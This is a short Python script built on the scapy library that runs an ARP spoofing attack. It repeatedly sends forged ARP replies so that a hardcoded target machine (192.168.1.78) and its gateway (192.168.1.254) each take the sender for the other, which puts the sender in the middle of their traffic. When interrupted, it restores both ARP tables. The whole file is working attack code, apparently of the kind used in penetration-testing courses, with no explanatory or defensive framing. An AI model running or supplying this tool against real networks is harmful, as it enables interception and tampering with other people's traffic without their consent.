#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    """Get MAC address for a given IP address."""
    # Create an ARP request packet to get the MAC address corresponding to the IP
    arp_request = scapy.ARP(pdst=ip)

    # Create an Ethernet frame to transport the ARP request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    # Send the ARP request and get the response
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    # Check if any responses were received
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"No response for IP: {ip}")
        return None

def spoof(target_ip, spoof_ip):
    """Spoof the target's ARP table."""
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Could not find MAC address for IP: {target_ip}")
        return

    # Construct ARP response to modify ARP table of target
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """Restore original ARP entry."""
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "192.168.1.78"
gateway_ip = "192.168.1.254"
sent_packets_count = 0

try:
    while True:
        # Spoof target's ARP table to think we are the gateway
        spoof(target_ip, gateway_ip)

        # Spoof gateway's ARP table to think we are the target
        spoof(gateway_ip, target_ip)
        
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end='')
        sys.stdout.flush()

        # Delay for 2 seconds before repeating the loop
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C .....Restoring ARP tables....Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

